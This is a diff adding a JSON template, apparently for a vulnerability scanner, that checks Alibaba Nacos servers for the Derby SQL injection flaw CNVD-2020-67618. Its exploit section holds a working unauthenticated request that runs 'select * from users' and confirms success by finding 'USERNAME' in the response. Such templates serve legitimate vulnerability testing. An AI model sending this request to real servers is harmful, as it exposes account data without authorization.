@@ -1,0 +1,33 @@
+{
+  "product": "Alibaba Nacos",
+  "vul_name": "Nacos derby SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CNVD-2020-67618"
+  ],
+  "level": 3,
+  "vul_desc": "Nacos v1/cs/ops/derby 存在SQL注入",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://zhuanlan.zhihu.com/p/633974026",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/nacos/v1/cs/ops/derby?sql=select * from users"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "USERNAME"
+        }
+      ]
+    }
+  }
+}
